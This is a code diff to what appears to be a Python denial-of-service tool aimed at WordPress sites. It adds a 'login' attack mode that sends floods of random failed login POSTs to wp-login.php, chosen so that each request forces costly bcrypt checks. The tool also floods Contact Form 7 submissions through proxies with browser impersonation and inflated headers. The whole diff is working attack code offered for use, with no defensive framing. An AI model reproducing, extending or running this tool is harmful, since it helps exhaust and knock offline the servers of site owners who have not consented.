@@ -148,6 +148,7 @@ HOMEPAGE_MODE = False
 
 LARGE_PAYLOAD    = False
 INFLATE_HEADERS  = False
+ATTACK_MODE      = "cf7"
 
 _ACCEPT_LANGS = [
     "en-US,en;q=0.9,fr-FR;q=0.8,fr;q=0.7,de-DE;q=0.6,de;q=0.5,es-ES;q=0.4,es;q=0.3,"
@@ -533,11 +534,31 @@ def send_one(req_num, cfg, pool):
     t0 = time.time()
     try:
         hdrs = _extra_headers(domain, ua) if INFLATE_HEADERS else _base_headers(domain, ua)
-        if HOMEPAGE_MODE:
+        px = {"http": proxy, "https": proxy} if proxy else None
+
+        if ATTACK_MODE == "login":
+            f = random_payload_fields()
+            r = cf_requests.post(
+                f"https://{domain}/wp-login.php",
+                data={
+                    "log":         f["name"].split()[0].lower(),
+                    "pwd":         f"Pass{random.randint(10000,99999)}!",
+                    "wp-submit":   "Log In",
+                    "redirect_to": f"https://{domain}/wp-admin/",
+                    "testcookie":  "1",
+                },
+                headers={**hdrs,
+                         "Content-Type": "application/x-www-form-urlencoded",
+                         "Cookie": "wordpress_test_cookie=WP+Cookie+check"},
+                proxies=px,
+                impersonate=impersonate,
+                timeout=25,
+            )
+        elif HOMEPAGE_MODE:
             r = cf_requests.get(
                 f"https://{domain}/",
                 headers=hdrs,
-                proxies={"http": proxy, "https": proxy} if proxy else None,
+                proxies=px,
                 impersonate=impersonate,
                 timeout=25,
             )
@@ -546,7 +567,7 @@ def send_one(req_num, cfg, pool):
                 cfg["url"],
                 multipart=build_multipart(cfg["form_id"], cfg["unit_tag"], large_payload=LARGE_PAYLOAD),
                 headers=hdrs,
-                proxies={"http": proxy, "https": proxy} if proxy else None,
+                proxies=px,
                 impersonate=impersonate,
                 timeout=25,
             )
@@ -802,6 +823,12 @@ def main():
                    help="Send fat request headers: 20-locale Accept-Language,\n"
                         "8-12 fake WP cookies, Sec-Fetch-*, DNT, X-Requested-With.\n"
                         "Forces PHP $_SERVER + WordPress cookie parsing overhead.")
+    p.add_argument("--mode",  default="cf7",
+                   choices=["cf7", "login"],
+                   help="Attack mode (default: cf7):\n"
+                        "  cf7   — CF7 REST API form submission (default)\n"
+                        "  login — wp-login.php POST flood; each failed attempt runs\n"
+                        "          bcrypt password_verify (~100ms CPU per request)")
     p.add_argument("--msg-repeat",   type=int, default=1, metavar="N",
                    help="Repeat the message body N times (separator between each).\n"
                         "N=5 → ~15KB, N=10 → ~30KB per request.\n"
@@ -848,6 +875,10 @@ def main():
     if args.inflate_headers:
         global INFLATE_HEADERS
         INFLATE_HEADERS = True
+
+    if args.mode != "cf7":
+        global ATTACK_MODE
+        ATTACK_MODE = args.mode
 
     if args.msg_repeat > 1:
         global MSG_REPEAT
